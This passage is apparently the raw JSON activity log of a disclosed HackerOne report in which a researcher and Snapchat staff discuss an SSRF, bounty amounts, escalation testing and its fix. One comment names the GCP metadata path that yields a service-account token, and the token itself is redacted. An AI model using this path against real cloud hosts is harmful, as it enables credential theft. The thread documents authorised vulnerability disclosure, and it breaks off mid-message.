wait!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T17:30:16.455Z","updated_at":"2019-04-30T17:30:16.455Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4692987,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Matthew, \n\nNo worries. I appreciate all the updates so far. I just noticed we never included that using the SSRF we can also hit the  `/computeMetadata/v1beta1/instance/service-accounts/default/token` endpoint on GCP:\n\n\n```\n{\"access_token\":\"████████\",\"expires_in\":2189,\"token_type\":\"Bearer\"}\n```\n\nWhich gives us access to :\n\n`https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=█████`\n\n\nI'm going to leave this vuln alone now and let you and the google team do some more investigating.","markdown_message":"\u003cp\u003eHey Matthew, \u003c/p\u003e\n\n\u003cp\u003eNo worries. I appreciate all the updates so far. I just noticed we never included that using the SSRF we can also hit the  \u003ccode\u003e/computeMetadata/v1beta1/instance/service-accounts/default/token\u003c/code\u003e endpoint on GCP:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;access_token\u0026quot;:\u0026quot;████████\u0026quot;,\u0026quot;expires_in\u0026quot;:2189,\u0026quot;token_type\u0026quot;:\u0026quot;Bearer\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich gives us access to :\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://www.googleapis.com/oauth2/v1/tokeninfo?access_token=█████\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m going to leave this vuln alone now and let you and the google team do some more investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T19:06:35.841Z","updated_at":"2020-11-04T10:55:43.614Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4695513,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @nahamsec, sorry I should've been more explicit previously: we were assuming exactly that. Our investigation into the impact was based off the idea that you'd use the internal metadata service and the issued token to access the GCP APIs.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, sorry I should\u0026#39;ve been more explicit previously: we were assuming exactly that. Our investigation into the impact was based off the idea that you\u0026#39;d use the internal metadata service and the issued token to access the GCP APIs.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T22:56:30.915Z","updated_at":"2019-04-30T22:56:30.915Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4695518,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ahhh ok! Looks like you are a step ahead of us! I'd be very curious to know what the GCP APIs can accomplish. Out of curiosity, how does this work with your services? Does this have access to anything internal on sc-corp or other internal snapchat.com services? I didn't wanna poke those and waste time if you guys have looked into it already. ","markdown_message":"\u003cp\u003eahhh ok! Looks like you are a step ahead of us! I\u0026#39;d be very curious to know what the GCP APIs can accomplish. Out of curiosity, how does this work with your services? Does this have access to anything internal on sc-corp or other internal snapchat.com services? I didn\u0026#39;t wanna poke those and waste time if you guys have looked into it already. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:00:14.628Z","updated_at":"2019-04-30T23:00:14.628Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4695577,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're setting the award based off of the total assessed impact here. We'll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\n\nThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance *scoped down* to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account's access is almost completely limited just to that single GCP project.\n\nUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user's data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there's plenty of other malicious behavior which could've been carried out here which is why we have it set at $3,500.\n\nAs always if you feel we've missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there's some path to escalate to other GCP projects that we did not anticipate.\n\nThanks!","markdown_message":"\u003cp\u003eWe\u0026#39;re setting the award based off of the total assessed impact here. We\u0026#39;ll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\u003c/p\u003e\n\n\u003cp\u003eThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance \u003cem\u003escoped down\u003c/em\u003e to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account\u0026#39;s access is almost completely limited just to that single GCP project.\u003c/p\u003e\n\n\u003cp\u003eUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user\u0026#39;s data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there\u0026#39;s plenty of other malicious behavior which could\u0026#39;ve been carried out here which is why we have it set at $3,500.\u003c/p\u003e\n\n\u003cp\u003eAs always if you feel we\u0026#39;ve missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there\u0026#39;s some path to escalate to other GCP projects that we did not anticipate.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:13:02.992Z","updated_at":"2019-04-30T23:13:02.992Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"700.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"ziot","url":"/ziot"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4695578,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're setting the award based off of the total assessed impact here. We'll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\n\nThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance *scoped down* to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account's access is almost completely limited just to that single GCP project.\n\nUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user's data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there's plenty of other malicious behavior which could've been carried out here which is why we have it set at $3,500.\n\nAs always if you feel we've missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there's some path to escalate to other GCP projects that we did not anticipate.\n\nThanks!","markdown_message":"\u003cp\u003eWe\u0026#39;re setting the award based off of the total assessed impact here. We\u0026#39;ll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\u003c/p\u003e\n\n\u003cp\u003eThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance \u003cem\u003escoped down\u003c/em\u003e to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account\u0026#39;s access is almost completely limited just to that single GCP project.\u003c/p\u003e\n\n\u003cp\u003eUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user\u0026#39;s data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there\u0026#39;s plenty of other malicious behavior which could\u0026#39;ve been carried out here which is why we have it set at $3,500.\u003c/p\u003e\n\n\u003cp\u003eAs always if you feel we\u0026#39;ve missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there\u0026#39;s some path to escalate to other GCP projects that we did not anticipate.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:13:03.831Z","updated_at":"2019-04-30T23:13:03.831Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"1400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"daeken","url":"/daeken"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4695579,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're setting the award based off of the total assessed impact here. We'll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\n\nThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance *scoped down* to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account's access is almost completely limited just to that single GCP project.\n\nUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user's data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there's plenty of other malicious behavior which could've been carried out here which is why we have it set at $3,500.\n\nAs always if you feel we've missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there's some path to escalate to other GCP projects that we did not anticipate.\n\nThanks!","markdown_message":"\u003cp\u003eWe\u0026#39;re setting the award based off of the total assessed impact here. We\u0026#39;ll likely follow up with a more detailed report later which goes into more depth into how we decided on this amount. Please note that as of this time the vulnerability is not yet remediated, but we try to ensure that people get paid out as soon as we understand the impact instead of when we fix it.\u003c/p\u003e\n\n\u003cp\u003eThe TL;DR version is that the token you can issue has the permissions of the service account attached to the given GCE instance \u003cem\u003escoped down\u003c/em\u003e to the access scopes. So in this case the full service account IAM permissions are limited to the scopes set for the instance. Ultimately the difference in permissions is not extremely large in this case because the service account\u0026#39;s access is almost completely limited just to that single GCP project.\u003c/p\u003e\n\n\u003cp\u003eUltimately, one of the biggest things that drives the needle for determining reward is the risk of our user\u0026#39;s data. In this case the GCP project and systems involved did not appear to have any sensitive user information which would have been at risk if this was abused. Of course, there\u0026#39;s plenty of other malicious behavior which could\u0026#39;ve been carried out here which is why we have it set at $3,500.\u003c/p\u003e\n\n\u003cp\u003eAs always if you feel we\u0026#39;ve missed something please say so! If you have some example escalation which allows you to escalate permissions to not be restrained by these instance scopes please let us know. This is especially impactful if there\u0026#39;s some path to escalate to other GCP projects that we did not anticipate.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:13:04.506Z","updated_at":"2019-04-30T23:13:04.506Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"1400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"nahamsec","url":"/nahamsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4695591,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey All,\n\nI'm a bit surprised in the bounty amount considering this is a core asset and how Snapchat bounties for out of scope domains like sc-corp.net or sc-dev (i.e. $3000 for subdomain takeover  on Sc-dev). We appreciate the bounty but it wasn't fully what we thought it'd receive considering your track record.\n\nThanks! ","markdown_message":"\u003cp\u003eHey All,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m a bit surprised in the bounty amount considering this is a core asset and how Snapchat bounties for out of scope domains like sc-corp.net or sc-dev (i.e. $3000 for subdomain takeover  on Sc-dev). We appreciate the bounty but it wasn\u0026#39;t fully what we thought it\u0026#39;d receive considering your track record.\u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:18:46.657Z","updated_at":"2019-04-30T23:18:46.657Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4695612,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @nahamsec, we sort of outlined it in the reward statement but just to reiterate: it's mainly due to the lack of impact to user data and due to the fact that the service account's access was limited in this case. The main GCP project this affected was just used for pulling information from webpages. If you have some additional information or evidence that shows there's more at risk here please let us know!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, we sort of outlined it in the reward statement but just to reiterate: it\u0026#39;s mainly due to the lack of impact to user data and due to the fact that the service account\u0026#39;s access was limited in this case. The main GCP project this affected was just used for pulling information from webpages. If you have some additional information or evidence that shows there\u0026#39;s more at risk here please let us know!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:25:20.472Z","updated_at":"2019-04-30T23:25:20.472Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4695695,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mbryant2 - Can you please give us permission to escalate this a bit? I can't find the dev instance for this app, we'd love to poke the dev instance a bit to see if we are able to escalate this if that's okay?","markdown_message":"\u003cp\u003e\u003ca href=\"/mbryant2\"\u003e@mbryant2\u003c/a\u003e - Can you please give us permission to escalate this a bit? I can\u0026#39;t find the dev instance for this app, we\u0026#39;d love to poke the dev instance a bit to see if we are able to escalate this if that\u0026#39;s okay?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T23:37:36.412Z","updated_at":"2019-04-30T23:37:36.412Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4695765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, feel free to escalate, just practice the usual level of caution. I don't *think* there's an accessible dev instance of this so feel free to test the production version. Let us know what you find, we'd be curious to know!","markdown_message":"\u003cp\u003eYep, feel free to escalate, just practice the usual level of caution. I don\u0026#39;t \u003cem\u003ethink\u003c/em\u003e there\u0026#39;s an accessible dev instance of this so feel free to test the production version. Let us know what you find, we\u0026#39;d be curious to know!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-01T00:10:31.079Z","updated_at":"2019-05-01T00:10:31.079Z","actor":{"username":"mbryant2","cleared":false,"url":"/mbryant2","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/qbxzNbNcbsuVA18eTfJr8zVZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4696916,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mbryant2 \n\nSo I did a bit of reading and I'm finally all caught up. I wanted to make a note that I played around with the GCP api to see what kind of access the vulnerabilities had. I appreciate you being so patient with us and allowing us to try and escalating this. If we find anything else, we'll make sure to make a note of it. Thanks again! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mbryant2\"\u003e@mbryant2\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eSo I did a bit of reading and I\u0026#39;m finally all caught up. I wanted to make a note that I played around with the GCP api to see what kind of access the vulnerabilities had. I appreciate you being so patient with us and allowing us to try and escalating this. If we find anything else, we\u0026#39;ll make sure to make a note of it. Thanks again! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-01T03:34:20.871Z","updated_at":"2019-05-01T03:34:20.871Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4723259,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mbryant2 - On may 11th I was able to exploit this exact issue on https://self-serve-ads.snap-dev.net which was from `Hostname: ███`. Did you by any chance have a look at this instance and its tokens to see if had the same impact?  Unfortunately that instance is no longer vulnerable. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mbryant2\"\u003e@mbryant2\u003c/a\u003e - On may 11th I was able to exploit this exact issue on \u003ca title=\"https://self-serve-ads.snap-dev.net\" href=\"/redirect?url=https%3A%2F%2Fself-serve-ads.snap-dev.net\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://self-serve-ads.snap-dev.net\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which was from \u003ccode\u003eHostname: ███\u003c/code\u003e. Did you by any chance have a look at this instance and its tokens to see if had the same impact?  Unfortunately that instance is no longer vulnerable. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-03T01:37:40.961Z","updated_at":"2020-11-04T10:56:42.500Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4897567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nahamsec We rolled out a remediation to snappublisher.snapchat.com - could you test against ads.snapchat.com again and verify if it was successful? Thanks!\n\nWe're also still looking into additional impact from the dev instance.","markdown_message":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e We rolled out a remediation to snappublisher.snapchat.com - could you test against ads.snapchat.com again and verify if it was successful? Thanks!\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re also still looking into additional impact from the dev instance.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-21T22:19:51.120Z","updated_at":"2019-05-21T22:19:51.120Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4897648,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@michael_xu - Awesome. I'll have a look an update you shortly! I think the Dev instance may have had more access than the one used in prod (esp with it being on snap-dev.net) and the fact that the scrapper for that instance was disabled hours after the submission makes me thing this may have had more access than anticipated. ","markdown_message":"\u003cp\u003e\u003ca href=\"/michael_xu\"\u003e@michael_xu\u003c/a\u003e - Awesome. I\u0026#39;ll have a look an update you shortly! I think the Dev instance may have had more access than the one used in prod (esp with it being on snap-dev.net) and the fact that the scrapper for that instance was disabled hours after the submission makes me thing this may have had more access than anticipated. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-21T22:51:13.839Z","updated_at":"2019-05-21T22:51:13.839Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4898666,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like this has been fixed! ","markdown_message":"\u003cp\u003eLooks like this has been fixed! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-22T04:24:58.942Z","updated_at":"2019-05-22T04:24:58.942Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4943609,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @michael_xu - Just checking in. Any luck with the dev instance?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/michael_xu\"\u003e@michael_xu\u003c/a\u003e - Just checking in. Any luck with the dev instance?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T19:06:51.837Z","updated_at":"2019-05-28T19:06:51.837Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4944520,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nahamsec - the dev instance had additional access to an internal resource that we're fully scoping out. We should have a bonus bounty decision by tomorrow EOD.","markdown_message":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e - the dev instance had additional access to an internal resource that we\u0026#39;re fully scoping out. We should have a bonus bounty decision by tomorrow EOD.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T22:33:11.130Z","updated_at":"2019-05-28T22:33:30.245Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4944529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's wonderful news! I  wanted to thank you for the awesome communication and the transparency for both this report and #569686. Thanks for being patient with us :) haha","markdown_message":"\u003cp\u003eThat\u0026#39;s wonderful news! I  wanted to thank you for the awesome communication and the transparency for both this report and \u003ca href=\"/reports/569686\"\u003e#569686\u003c/a\u003e. Thanks for being patient with us :) haha\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T22:37:26.817Z","updated_at":"2019-05-28T22:37:26.817Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4951461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nahamsec sorry, but we're still looking into the total transitive impact. We'll try to have an update by EoW.","markdown_message":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e sorry, but we\u0026#39;re still looking into the total transitive impact. We\u0026#39;ll try to have an update by EoW.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-29T23:58:16.489Z","updated_at":"2019-05-29T23:58:16.489Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4951467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries at all. Thanks for digging into this for us! If there's anything we can do to help, please let us know! ","markdown_message":"\u003cp\u003eNo worries at all. Thanks for digging into this for us! If there\u0026#39;s anything we can do to help, please let us know! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-30T00:02:16.243Z","updated_at":"2019-05-30T00:02:16.243Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4951472,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is it possible to know what kind of access it had or what internal resource it was?","markdown_message":"\u003cp\u003eIs it possible to know what kind of access it had or what internal resource it was?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-30T00:05:00.368Z","updated_at":"2019-05-30T00:05:00.368Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4995200,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @michael_xu - The suspense is kinda killing us. Anyway to get an update? ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/michael_xu\"\u003e@michael_xu\u003c/a\u003e - The suspense is kinda killing us. Anyway to get an update? \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-04T17:40:29.666Z","updated_at":"2019-06-04T17:40:29.666Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4997522,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nahamsec Sorry for the additional delay. The dev instance didn't have significant permissions beyond the prod instance (the dev project itself), but crucially had access to a set of internal test credentials. There will be an additional bounty, but the amount will depend on what those credentials had access to. Finding that set of services is what's taking so long right now.\n\nThanks for your patience!","markdown_message":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e Sorry for the additional delay. The dev instance 